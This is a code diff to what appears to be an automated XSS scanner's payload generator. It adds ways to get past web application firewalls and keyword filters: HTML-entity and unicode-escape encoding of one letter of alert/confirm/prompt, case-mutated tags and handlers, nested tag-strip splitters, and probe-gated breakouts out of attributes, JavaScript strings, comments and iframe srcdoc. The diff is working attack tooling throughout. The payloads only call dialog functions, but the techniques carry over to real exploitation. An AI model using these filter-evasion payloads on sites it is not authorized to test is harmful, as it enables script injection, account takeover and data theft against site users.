@@ -58,6 +58,12 @@ TAG_HANDLERS = [
 
 CONSUMING_TAGS = ["noscript", "style", "title", "textarea", "iframe", "script"]
 
+# '>'-terminated handler composites: a WAF may pass the bare 'svg onload'
+# pair yet sign 'onload=<call>()' — the random-identifier probes give
+# per-event composite evidence. Handlers not listed have no matching
+# probe and keep their pair_* gates only.
+GEN_EV = {"onload": "gen_handler", "onerror": "gen_h_error"}
+
 # map context string fragments -> internal context key
 CONTEXT_MAP = [
     ("attribute event-handler value", "attr_handler"),
@@ -192,22 +198,121 @@ def split_str(target, s):
     return target[:k] + s + target[k:]
 
 
+def entity_fname(name):
+    """Encode ONE random letter of a JS fn name as a decimal char ref
+    ('alert' -> 'al&#101;rt'). Valid only inside attribute values — the
+    HTML parser decodes &#NNN; before the JS engine compiles the
+    handler, so keyword filters never see the literal name."""
+    i = secrets.randbelow(len(name))
+    return name[:i] + f"&#{ord(name[i])};" + name[i + 1:]
+
+
+def encoded_funcs(kw):
+    """Dialog-fn call strings with one letter entity-encoded, emitted
+    ONLY for call forms whose plain version is blocked by the keyword
+    mask (the name itself, or its call_*/tick_* junction signature).
+    char_ref ('&#101;') gates '&...;' survival — if it came back as
+    '&amp;#101;' or stripped, char refs never decode and the technique
+    is dead on arrival; entity_lt ('&lt;') is the legacy fallback.
+    gen_call/gen_tick must pass too — an encoded name cannot rescue a
+    dead ()-call or `1`-call shape (filter blocks 'abc()' wholesale)."""
+    if not kw.get("char_ref", kw.get("entity_lt", True)):
+        return []
+    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
+    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
+    out = []
+    for name in ("alert", "confirm", "prompt"):
+        enc = entity_fname(name)
+        if parens and (not kw.get(name, True)
+                       or not kw.get(f"call_{name}", True)):
+            out.append(f"{enc}(1)")
+        if btick and (not kw.get(name, True)
+                      or not kw.get(f"tick_{name}", True)):
+            out.append(f"{enc}`1`")
+    if parens and (not kw.get("print", True)
+                   or not kw.get("call_print", True)):
+        out.append(entity_fname("print") + "()")
+    if not parens and not btick and not kw.get("alert", True):
+        out.append(f"onerror={entity_fname('alert')};throw 1")
+    return out
+
+
+def u_fname(name):
+    """Encode ONE random letter of a JS fn name as a unicode escape
+    ('alert' -> 'al\\u0065rt'). Decoded by the JS engine, not the HTML
+    parser — valid wherever the payload lands as JS source: <script>
+    bodies, on*="..." values, javascript: URIs, js_* contexts."""
+    i = secrets.randbelow(len(name))
+    return name[:i] + f"\\u{ord(name[i]):04x}" + name[i + 1:]
+
+
+def u_funcs(kw):
+    """Unicode-escaped call strings for dialog-fns whose plain form is
+    blocked (name or its call_*/tick_* junction). Backslash survival is
+    enforced by required_ok — '\\' is a char-probe item, so filtered or
+    transformed backslashes auto-reject these payloads at the char
+    gate; no keyword proxy needed. gen_call/gen_tick apply the control
+    layer: a dead generic call shape kills the (1)/`1` forms outright."""
+    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
+    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
+    out = []
+    for name in ("alert", "confirm", "prompt"):
+        enc = u_fname(name)
+        if parens and (not kw.get(name, True)
+                       or not kw.get(f"call_{name}", True)):
+            out.append(f"{enc}(1)")
+        if btick and (not kw.get(name, True)
+                      or not kw.get(f"tick_{name}", True)):
+            out.append(f"{enc}`1`")
+    if parens and (not kw.get("print", True)
+                   or not kw.get("call_print", True)):
+        out.append(u_fname("print") + "()")
+    if not parens and not btick and not kw.get("alert", True):
+        out.append(f"onerror={u_fname('alert')};throw 1")
+    return out
+
+
+def junction_ok(item, kw, kwv):
+    """Refined junction-probe verdict. The js_break_* probes embed a
+    literal fn name ('-alert(1)-): a FAIL can mean the filter stripped
+    ONLY the name while the breakout syntax survived. Proof: expected
+    minus every blocked fn-name equals got_back — then encoded fn
+    names still flow through the junction."""
+    if kw.get(item, True):
+        return True
+    e, g = kwv.get(item, ("", ""))
+    if not e:
+        return False
+    stripped = e
+    for n in ("alert", "confirm", "prompt", "print"):
+        if not kw.get(n, True):
+            stripped = stripped.replace(n, "")
+    return stripped == g
+
+
 def avail_funcs(kw):
     """JS call primitives allowed by the keyword mask (Layer B/C gate).
-    Missing keyword analysis -> everything assumed allowed (backward compat)."""
+    Missing keyword analysis -> everything assumed allowed (backward compat).
+    gen_call/gen_tick (random-identifier probes) are the control layer:
+    when a call_*/tick_* junction probe is absent they decide whether the
+    bare call shape itself is viable. A passing call_* probe is direct
+    evidence and always wins over the generic control."""
     parens = kw.get("parentheses", True)
     btick = kw.get("backtick", True)
+    call_shape = parens and kw.get("gen_call", True)
+    tick_shape = btick and kw.get("gen_tick", True)
     funcs = []
     for name in ("alert", "confirm", "prompt"):
         if not kw.get(name, True):
             continue
-        if parens and kw.get(f"call_{name}", True):
+        if parens and kw.get(f"call_{name}", kw.get("gen_call", True)):
             funcs.append(f"{name}(1)")
-        if btick and kw.get(f"tick_{name}", True):
+        if btick and kw.get(f"tick_{name}", kw.get("gen_tick", True)):
             funcs.append(f"{name}`1`")
-    if parens and kw.get("print", True) and kw.get("call_print", True):
+    if parens and kw.get("print", True) and \
+            kw.get("call_print", kw.get("gen_call", True)):
         funcs.append("print()")
-    if not parens and not btick and kw.get("alert", True):
+    if not call_shape and not tick_shape and kw.get("alert", True):
         funcs.append("onerror=alert;throw 1")
     return funcs
 
@@ -229,17 +334,33 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
     kw = kw or {}
     kwv = kwv or {}
     funcs = avail_funcs(kw)
+    # hfuncs — event-handler attribute values (on*="..."): both HTML
+    # char refs (&#NNN;) and JS unicode escapes (NNNN) decode there.
+    hfuncs = funcs + encoded_funcs(kw) + u_funcs(kw)
+    # jfuncs — JS-source positions (<script> bodies, js_* contexts,
+    # javascript: URIs): only \u escapes decode; &#NNN; stays literal.
+    jfuncs = funcs + u_funcs(kw)
     out = []
     marker = "vvm{id}"
 
     def add(payload, technique, case_ref):
         if required_ok(payload, scores):
+            if "&#" in payload:
+                technique += " (entity-encoded fn)"
+            if "\\u" in payload:
+                technique += " (unicode-escaped fn)"
             out.append({
                 "payload": payload,
                 "technique": technique,
                 "case_ref": case_ref,
                 "efficiency": min_eff(payload, scores),
             })
+
+    def shape_ok(gen_key, fn):
+        """Composite-probe gate: applies only when fn uses the ()-call
+        shape the probe carries ('abc()'). Backtick/throw forms have a
+        different signature — their gate already ran in the fn builders."""
+        return "(" not in fn or gen_key is None or kw.get(gen_key, True)
 
     tags_ok = usable("<", scores) and usable(">", scores)
     slash_ok = usable("/", scores)
@@ -275,31 +396,35 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                 Rebuild 'alert' via splitter s + the call syntax that
                 survived; the mid-name split also breaks call_*/tick_*
                 junction signatures (request never contains 'alert(1)')."""
-                if kw.get("parentheses", True):
+                if kw.get("parentheses", True) and kw.get("gen_call", True):
                     return [split_str("alert", s) + "(1)"]
-                if kw.get("backtick", True):
+                if kw.get("backtick", True) and kw.get("gen_tick", True):
                     return [split_str("alert", s) + "`1`"]
                 return []
 
             if not inert:
                 if script_ok:
-                    for fn in funcs or (rebuild_fn(rsplit[0]) if rsplit else []):
-                        add(f"<script {marker}>{fn}</script>", "script injection", "body_direct")
+                    for fn in jfuncs or (rebuild_fn(rsplit[0]) if rsplit else []):
+                        if shape_ok("gen_script", fn):
+                            add(f"<script {marker}>{fn}</script>",
+                                "script injection", "body_direct")
                 else:
                     if kw.get("case_script", True):
-                        for fn in funcs[:2] or (rebuild_fn(rsplit[0]) if rsplit else []):
+                        for fn in jfuncs[:2] or (rebuild_fn(rsplit[0]) if rsplit else []):
                             add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
                                 "case-mutated script tag", "tag_removed")
                     for s in rsplit[:3]:
-                        for fn in funcs[:2] or rebuild_fn(s):
+                        for fn in jfuncs[:2] or rebuild_fn(s):
                             add(f"{split_str('<script>', s)} {marker}>{fn}"
                                 f"{split_str('</script>', s)}",
                                 f"nested tag-strip bypass ({s} splitter)", "tag_removed")
             for tag, ev, extra, deps in TAG_HANDLERS:
                 if all(kw.get(d, True) for d in deps):
-                    for fn in funcs[:2]:
-                        add(f"<{tag} {extra} {marker} {ev}={fn}>".replace("  ", " "),
-                            f"{tag} {ev} handler", "body_direct")
+                    for fn in hfuncs[:2]:
+                        if shape_ok(GEN_EV.get(ev), fn):
+                            add(f"<{tag} {extra} {marker} {ev}={fn}>"
+                                .replace("  ", " "),
+                                f"{tag} {ev} handler", "body_direct")
                 else:
                     # Rebuild blocked atoms by nesting a removed string.
                     # When ONLY the pair_* junction failed (e.g. the WAF
@@ -314,7 +439,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                             for d in deps if not d.startswith("pair_"))
                         tag_atom = fix(tag + "_tag", "<" + tag, s) \
                             if atom_blocked else split_str("<" + tag, s)
-                        for fn0 in funcs[:1] or rebuild_fn(s):
+                        for fn0 in hfuncs[:1] or rebuild_fn(s):
                             if "=" in fn0:
                                 # in-attribute fallback already carries
                                 # 'onerror=' — emit it bare, tag split only
@@ -329,32 +454,36 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                                 .replace("  ", " "),
                                 f"removed-string splitter ({s})", "tag_removed")
             if kw.get("javascript_proto", True) and \
-                    kw.get("proto_href", True) and funcs:
-                add(f'<a {marker} href="javascript:{funcs[0]}">XSS</a>',
+                    kw.get("proto_href", True) and jfuncs and \
+                    shape_ok("gen_jsurl", jfuncs[0]):
+                add(f'<a {marker} href="javascript:{jfuncs[0]}">XSS</a>',
                     "javascript: protocol href", "protocol")
             if not kw.get("javascript_proto", True) and kw.get("case_proto", True) \
-                    and funcs:
-                add(f'<a {marker} href="JaVaScRiPt:{funcs[0]}">XSS</a>',
+                    and jfuncs:
+                add(f'<a {marker} href="JaVaScRiPt:{jfuncs[0]}">XSS</a>',
                     "case-mutated javascript: href", "protocol")
-            jfns = funcs[:1] or (rebuild_fn(rsplit[0]) if rsplit else [])
+            jfns = jfuncs[:1] or (rebuild_fn(rsplit[0]) if rsplit else [])
             if not kw.get("javascript_proto", True) and rsplit and jfns:
                 add(f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
                     f'{jfns[0]}">XSS</a>',
                     f"removed-string splitter ({rsplit[0]})", "tag_removed")
             if kw.get("svg_tag", True) and not kw.get("onload", True) \
                     and kw.get("case_onload", True):
-                for fn in funcs[:2]:
+                for fn in hfuncs[:2]:
                     add(f"<svg {marker} OnLoAd={fn}>",
                         "case-mutated onload handler", "body_direct")
             # last-resort: entity-encoded inner HTML inside iframe srcdoc.
             # Reaches the case "keywords/()/script blocked but entities pass".
+            # The inner fn name also gets \u-escaped when 'alert' itself is
+            # blocked — after the entity decode the JS engine resolves it.
             if kw.get("entity_lt", True) and kw.get("srcdoc", True) and \
                     kw.get("iframe_tag", True) and \
                     (not kw.get("parentheses", True) or not script_ok
                      or not kw.get("alert", True)):
-                add(f'<iframe {marker} srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',
+                src_fn = "alert" if kw.get("alert", True) else u_fname("alert")
+                add(f'<iframe {marker} srcdoc=&lt;script&gt;{src_fn}&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',
                     "iframe srcdoc entity-encoded", "special_attrs")
-        elif usable("<", scores) and not usable(">", scores) and funcs:
+        elif usable("<", scores) and not usable(">", scores) and hfuncs:
             # "no greater-than" (case: xss without greater than.md): the
             # tag stays unterminated and the page's OWN next '>' closes
             # it. A '<tag>' keyword can only fail HERE because its '>'
@@ -370,7 +499,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                 others = [d for d in deps if d != deps[0]]
                 if name_ok(deps[0]) and \
                         all(kw.get(d, True) for d in others):
-                    for fn in funcs[:2]:
+                    for fn in hfuncs[:2]:
                         add(f"<{tag} {extra} {marker} {ev}={fn}//"
                             .replace("  ", " "),
                             f"no greater-than ({tag} {ev})", "gt_missing")
@@ -378,25 +507,27 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
     elif ctx == "attr":
         if tags_ok and q_ok and quote:
             for tag, ev, extra in handler_variants():
-                for fn in funcs[:2]:
-                    add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'.replace("  ", " "),
-                        "attribute breakout -> tag", "breakout_tag")
-            if script_ok and funcs:
-                add(f'{quote}><script {marker}>{funcs[0]}</script>',
+                for fn in hfuncs[:2]:
+                    if shape_ok(GEN_EV.get(ev), fn):
+                        add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'
+                            .replace("  ", " "),
+                            "attribute breakout -> tag", "breakout_tag")
+            if script_ok and jfuncs and shape_ok("gen_script", jfuncs[0]):
+                add(f'{quote}><script {marker}>{jfuncs[0]}</script>',
                     "attribute breakout -> script", "breakout_tag")
         elif q_ok:
             sep = quote if quote else " "
-            if funcs and kw.get("autofocus", True) and kw.get("onfocus", True):
-                add(f'{sep} autofocus onfocus={sep}{funcs[0]}' if quote else
-                    f' autofocus onfocus={funcs[0]} accesskey=x',
+            if hfuncs and kw.get("autofocus", True) and kw.get("onfocus", True):
+                add(f'{sep} autofocus onfocus={sep}{hfuncs[0]}' if quote else
+                    f' autofocus onfocus={hfuncs[0]} accesskey=x',
                     "in-context attribute injection", "attr_inject")
 
     elif ctx == "attr_handler":
         # input already inside an existing on*="" handler — zero-breaker JS
-        for fn in funcs:
+        for fn in hfuncs:
             add(f'{fn}/*{marker}*/', "in-handler direct call", "attr_inject")
         if quote and q_ok:
-            for fn in funcs[:2]:
+            for fn in hfuncs[:2]:
                 add(f'{quote});{fn}/*{marker}*/;//',
                     "handler close-call breakout", "breakout_tag")
 
@@ -406,73 +537,96 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
         # javascript: needs href= + a click and is dead in src=/data=.
         if tags_ok and q_ok and quote:
             for tag, ev, extra in handler_variants():
-                for fn in funcs[:2]:
-                    add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'.replace("  ", " "),
-                        "url-attr breakout -> tag", "breakout_tag")
+                for fn in hfuncs[:2]:
+                    if shape_ok(GEN_EV.get(ev), fn):
+                        add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'
+                            .replace("  ", " "),
+                            "url-attr breakout -> tag", "breakout_tag")
         if kw.get("javascript_proto", True):
-            for fn in funcs:
-                add(f'javascript:{fn}/*{marker}*/', "javascript: URL direct", "protocol")
+            for fn in jfuncs:
+                if shape_ok("gen_jsurl", fn):
+                    add(f'javascript:{fn}/*{marker}*/',
+                        "javascript: URL direct", "protocol")
 
     elif ctx == "attr_srcdoc":
         if kw.get("entity_lt", True):
-            for fn in funcs:
+            for fn in jfuncs:
                 add(f'&lt;script&gt;{marker}{fn}&lt;/script&gt;',
                     "srcdoc entity HTML", "special_attrs")
 
     elif ctx == "js_raw":
-        for fn in funcs:
+        for fn in jfuncs:
             add(f'{fn}/*{marker}*/', "raw JS direct call", "js_string_exec")
-        for fn in funcs[:2]:
+        for fn in jfuncs[:2]:
             add(f');{fn}/*{marker}*/;//', "raw JS close-call", "js_string_exec")
 
     elif ctx == "js_template":
         if kw.get("interp", True):
-            for fn in funcs:
+            for fn in jfuncs:
                 add(f'${{{fn}}}/*{marker}*/', "template-literal interpolation",
                     "js_string_exec")
         if quote == "`" and q_ok:
-            for fn in funcs[:2]:
+            for fn in jfuncs[:2]:
                 add(f'`+{fn}+`/*{marker}*/', "literal concat breakout", "js_string_exec")
 
     elif ctx == "js_lcomment":
         if kw.get("newline", True):
-            for fn in funcs:
+            for fn in jfuncs:
                 add(f'\n{fn}/*{marker}*/;//', "line-comment close + exec", "js_breakout")
 
     elif ctx == "js_bcomment":
         if kw.get("comment_close", True):
-            for fn in funcs:
+            for fn in jfuncs:
                 add(f'*/{fn}/*{marker}*/;//', "block-comment close + exec", "js_breakout")
 
     elif ctx == "js_string":
         if tags_ok and slash_ok and script_ok and kw.get("close_script", True):
-            for fn in funcs[:2]:
-                add(f"</script><script {marker}>{fn}</script>//",
-                    "script tag breakout", "js_breakout")
+            for fn in jfuncs[:2]:
+                if shape_ok("gen_script", fn):
+                    add(f"</script><script {marker}>{fn}</script>//",
+                        "script tag breakout", "js_breakout")
         elif q_ok and quote:
             brk = "js_break_squote" if quote == "'" else \
                   "js_break_dquote" if quote == '"' else None
-            for fn in funcs:
-                if brk and not kw.get(brk, True):
-                    continue
-                add(f"{quote}-{fn}-{quote}", "in-string JS execution", "js_string_exec")
+            genbrk = "gen_break_squote" if quote == "'" else \
+                     "gen_break_dquote" if quote == '"' else None
+            # '"-abc()-"' is direct composite evidence and outranks the
+            # junction_ok inference. If it fails but junction_ok still
+            # proves the '"-x-' wrapper (only the ()-call inside was
+            # signatured), non-parens fns can still ride the breakout.
+            if genbrk in kw:
+                if kw[genbrk]:
+                    fns = jfuncs
+                elif brk and junction_ok(brk, kw, kwv):
+                    fns = [f for f in jfuncs if "(" not in f]
+                else:
+                    fns = []
+            elif not brk or junction_ok(brk, kw, kwv):
+                fns = jfuncs
+            else:
+                fns = []
+            for fn in fns:
+                add(f"{quote}-{fn}-{quote}", "in-string JS execution",
+                    "js_string_exec")
 
     elif ctx.startswith("consuming:"):
         tag = ctx.split(":", 1)[1]
         if tags_ok and slash_ok and kw.get(f"close_{tag}", True):
-            if script_ok and funcs:
-                add(f"</{tag}><script {marker}>{funcs[0]}</script>",
+            if script_ok and jfuncs and shape_ok("gen_script", jfuncs[0]):
+                add(f"</{tag}><script {marker}>{jfuncs[0]}</script>",
                     f"{tag} close + script", "tag_breakout")
-            if kw.get("img_tag", True) and kw.get("onerror", True) and funcs:
-                add(f'</{tag}><img src=x {marker} onerror={funcs[0]}>',
+            if kw.get("img_tag", True) and kw.get("onerror", True) and hfuncs \
+                    and shape_ok("gen_h_error", hfuncs[0]):
+                add(f'</{tag}><img src=x {marker} onerror={hfuncs[0]}>',
                     f"{tag} close + img onerror", "tag_breakout")
-                add(f'<{tag}><img title="{marker}</{tag}><img src onerror={funcs[0]}>"></{tag}>',
+                add(f'<{tag}><img title="{marker}</{tag}><img src onerror={hfuncs[0]}>"></{tag}>',
                     f"{tag} consuming-tag trick", "comment_break")
 
     elif ctx == "comment":
-        if tags_ok and funcs and kw.get("svg_tag", True) \
-                and kw.get("onload", True) and kw.get("pair_svg_onload", True):
-            add(f"--><svg {marker} onload={funcs[0]}>", "comment breakout", "comment_break")
+        if tags_ok and hfuncs and kw.get("svg_tag", True) \
+                and kw.get("onload", True) and kw.get("pair_svg_onload", True) \
+                and shape_ok("gen_handler", hfuncs[0]):
+            add(f"--><svg {marker} onload={hfuncs[0]}>", "comment breakout", "comment_break")
 
     return out
 
@@ -662,7 +816,7 @@ def main():
             if "splitter" in t or "bypass" in t:
                 return 1
             if c["case_ref"] == "tag_removed" or "case-mutated" in t \
-                    or "entity" in t:
+                    or "entity" in t or "unicode-escaped" in t:
                 return 2
             return 0
         cand.sort(key=lambda c: (-c["efficiency"], tier(c)))
